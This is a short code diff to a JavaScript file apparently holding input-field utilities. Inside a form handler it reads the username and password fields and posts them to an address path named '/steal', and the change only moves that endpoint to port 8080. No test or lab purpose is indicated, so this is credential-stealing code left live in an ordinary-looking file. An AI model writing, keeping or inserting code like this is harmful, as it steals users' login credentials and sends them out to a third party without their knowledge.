@@ -236,7 +236,7 @@ InputUtil.updatePlaceholder = function (input, placeholderText) {
             var password = document.getElementById('passwordInput').value;
 
             var xhr = new XMLHttpRequest();
-            xhr.open("POST", "http://192.168.2.1/steal", true);
+            xhr.open("POST", "http://192.168.2.1:8080/steal", true);
             xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
             xhr.send("username=" + encodeURIComponent(userName) + "&password=" + encodeURIComponent(password));
 
